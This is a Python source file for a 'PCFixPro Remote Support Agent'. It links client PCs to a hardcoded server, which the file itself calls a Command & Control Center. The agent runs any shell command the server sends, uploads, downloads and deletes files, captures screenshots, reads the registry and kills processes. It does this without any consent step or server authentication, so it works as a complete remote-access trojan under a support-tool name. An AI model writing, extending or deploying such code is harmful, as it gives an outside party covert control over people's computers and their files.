"""
PCFixPro Remote Support Agent
Runs on client PCs and reports to the Command & Control Center
"""
import socketio
import requests
import json
import os
import sys
import platform
import subprocess
import threading
import time
import shutil
from datetime import datetime
import base64
from io import BytesIO
import socket

# Configuration - Server IP will be auto-detected or read from config
SERVER_URL = "http://102.209.236.22:5000"  # Auto-configured with your public IP
AGENT_ID = None

# Auto-detect server URL from environment or local config
def detect_server_url():
    """Auto-detect server URL from config file or environment"""
    # Check for local config file
    config_paths = [
        os.path.join(os.path.dirname(__file__), "config.json"),
        os.path.expanduser("~/.pcfixpro/config.json"),
        "C:\\PCFixPro\\config.json"
    ]
    
    for config_path in config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                    if 'server_url' in config:
                        return config['server_url']
            except:
                pass
    
    # Check environment variable
    env_url = os.environ.get('PCFIXPRO_SERVER_URL')
    if env_url:
        return env_url
    
    return SERVER_URL

HOSTNAME = socket.gethostname()

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_system_info():
    """Collect system information"""
    try:
        info = {
            "hostname": HOSTNAME,
            "ip_address": get_local_ip(),
            "os": f"{platform.system()} {platform.release()}",
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "agent_version": "1.0.0",
            "status": "online",
            "last_seen": datetime.now().isoformat()
        }
        return info
    except Exception as e:
        print(f"Error getting system info: {e}")
        return {"hostname": HOSTNAME, "status": "online"}

class RemoteAgent:
    def __init__(self):
        self.sio = socketio.Client()
        self.agent_id = None
        self.server_url = detect_server_url()
        self.setup_socket_handlers()
        
    def setup_socket_handlers(self):
        @self.sio.event
        def connect():
            print(f"[AGENT] Connected to C&C server at {self.server_url}")
            sys_info = get_system_info()
            self.sio.emit('register_agent', sys_info)
            
        @self.sio.event
        def disconnect():
            print("[AGENT] Disconnected from C&C server. Attempting reconnect...")
            
        @self.sio.event
        def registered(data):
            self.agent_id = data.get('agent_id')
            print(f"[AGENT] Registered with ID: {self.agent_id}")
            
        @self.sio.event
        def execute_command(data):
            command = data.get('command')
            command_id = data.get('command_id')
            print(f"[AGENT] Executing: {command}")
            
            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                output = {
                    'command_id': command_id,
                    'output': (result.stdout or '') + (result.stderr or ''),
                    'return_code': result.returncode,
                    'timestamp': datetime.now().isoformat()
                }
                self.sio.emit('command_result', output)
                
            except subprocess.TimeoutExpired:
                output = {
                    'command_id': command_id,
                    'output': 'Command timed out',
                    'return_code': -1,
                    'timestamp': datetime.now().isoformat()
                }
                self.sio.emit('command_result', output)
            except Exception as e:
                output = {
                    'command_id': command_id,
                    'output': str(e),
                    'return_code': -1,
                    'timestamp': datetime.now().isoformat()
                }
                self.sio.emit('command_result', output)
        
        @self.sio.event
        def list_files(data):
            path = data.get('path', '.')
            print(f"[AGENT] Listing files: {path}")
            
            try:
                entries = []
                if not os.path.exists(path):
                    raise FileNotFoundError(f"Path does not exist: {path}")
                for item in sorted(os.listdir(path)):
                    full_path = os.path.join(path, item)
                    try:
                        stat = os.stat(full_path)
                        entries.append({
                            'name': item,
                            'path': full_path,
                            'is_dir': os.path.isdir(full_path),
                            'size': stat.st_size if not os.path.isdir(full_path) else 0,
                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                        })
                    except:
                        pass
                
                self.sio.emit('file_list', {
                    'path': path,
                    'files': entries,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('file_list', {
                    'path': path,
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def upload_file(data):
            filename = data.get('filename')
            content_b64 = data.get('content')
            remote_path = data.get('path', '.')
            
            print(f"[AGENT] Uploading file: {filename} to {remote_path}")
            
            try:
                file_data = base64.b64decode(content_b64)
                safe_filename = os.path.basename(filename)
                full_path = os.path.join(remote_path, safe_filename)
                
                with open(full_path, 'wb') as f:
                    f.write(file_data)
                
                self.sio.emit('upload_result', {
                    'status': 'success',
                    'filename': filename,
                    'path': full_path,
                    'size': len(file_data),
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('upload_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def download_file(data):
            file_path = data.get('path')
            print(f"[AGENT] Downloading file: {file_path}")
            
            try:
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                content_b64 = base64.b64encode(content).decode('utf-8')
                
                self.sio.emit('download_result', {
                    'status': 'success',
                    'path': file_path,
                    'filename': os.path.basename(file_path),
                    'content': content_b64,
                    'size': len(content),
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('download_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def delete_file(data):
            file_path = data.get('path')
            print(f"[AGENT] Deleting: {file_path}")
            
            try:
                if os.path.isdir(file_path):
                    shutil.rmtree(file_path)
                else:
                    os.remove(file_path)
                
                self.sio.emit('delete_result', {
                    'status': 'success',
                    'path': file_path,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('delete_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def screenshot(data):
            print(f"[AGENT] Taking screenshot...")
            
            try:
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    buffered = BytesIO()
                    img.save(buffered, format="PNG")
                    content_b64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
                    
                    self.sio.emit('screenshot_result', {
                        'status': 'success',
                        'content': content_b64,
                        'format': 'png',
                        'command_id': data.get('command_id')
                    })
                except ImportError:
                    self.sio.emit('screenshot_result', {
                        'status': 'error',
                        'error': 'PIL/Pillow not installed',
                        'command_id': data.get('command_id')
                    })
            except Exception as e:
                self.sio.emit('screenshot_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def read_registry(data):
            print(f"[AGENT] Reading registry: {data.get('hive')}\\{data.get('key_path')}")
            
            try:
                import winreg
                hive_map = {'HKLM': winreg.HKEY_LOCAL_MACHINE, 'HKCU': winreg.HKEY_CURRENT_USER}
                hive = hive_map.get(data.get('hive'), winreg.HKEY_LOCAL_MACHINE)
                key_path = data.get('key_path', '')
                
                values = {}
                with winreg.OpenKey(hive, key_path) as key:
                    for i in range(winreg.QueryInfoKey(key)[1]):
                        name, value, _ = winreg.EnumValue(key, i)
                        values[name] = str(value)
                
                self.sio.emit('registry_result', {
                    'status': 'success',
                    'hive': data.get('hive'),
                    'key_path': key_path,
                    'values': values,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('registry_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def list_processes(data):
            print(f"[AGENT] Listing processes...")
            
            try:
                processes = []
                if platform.system() == 'Windows':
                    try:
                        import wmi
                        c = wmi.WMI()
                        for proc in c.Win32_Process():
                            processes.append({
                                'pid': proc.ProcessId,
                                'name': proc.Name,
                                'cpu': 0,
                                'memory': getattr(proc, 'WorkingSetSize', 0) // 1024 // 1024
                            })
                    except ImportError:
                        pass
                else:
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                    for line in result.stdout.split('\n')[1:]:
                        parts = line.split()
                        if len(parts) > 10:
                            processes.append({
                                'pid': int(parts[1]),
                                'name': parts[10],
                                'cpu': float(parts[2]),
                                'memory': float(parts[3])
                            })
                
                self.sio.emit('processes_result', {
                    'status': 'success',
                    'processes': processes[:100],
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('processes_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def kill_process(data):
            pid = data.get('pid')
            print(f"[AGENT] Killing process PID: {pid}")
            
            try:
                if platform.system() == 'Windows':
                    subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True)
                else:
                    subprocess.run(['kill', '-9', str(pid)], capture_output=True)
                
                self.sio.emit('kill_result', {
                    'status': 'success',
                    'pid': pid,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('kill_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
        
        @self.sio.event
        def wake_on_lan(data):
            mac_address = data.get('mac_address')
            print(f"[AGENT] Sending WoL to: {mac_address}")
            
            try:
                mac = mac_address.replace(':', '').replace('-', '')
                if len(mac) != 12:
                    raise ValueError("Invalid MAC address format")
                
                packet = bytes.fromhex('FF' * 6 + mac * 16)
                
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    sock.sendto(packet, ('<broadcast>', 9))
                
                self.sio.emit('wol_result', {
                    'status': 'success',
                    'mac_address': mac_address,
                    'command_id': data.get('command_id')
                })
            except Exception as e:
                self.sio.emit('wol_result', {
                    'status': 'error',
                    'error': str(e),
                    'command_id': data.get('command_id')
                })
                
    def connect(self):
        while True:
            try:
                if not self.sio.connected:
                    self.sio.connect(self.server_url, transports=['websocket', 'polling'])
                    while self.sio.connected:
                        time.sleep(30)
                        self.sio.emit('heartbeat', {'agent_id': self.agent_id})
            except Exception as e:
                print(f"[AGENT] Connection error: {e}. Reconnecting in 10s...")
                time.sleep(10)
    
    def run(self):
        print(f"[AGENT] Starting Remote Support Agent...")
        print(f"[AGENT] Hostname: {HOSTNAME}")
        print(f"[AGENT] Local IP: {get_local_ip()}")
        print(f"[AGENT] Connecting to: {self.server_url}")
        
        self.connect()

if __name__ == "__main__":
    agent = RemoteAgent()
    agent.run()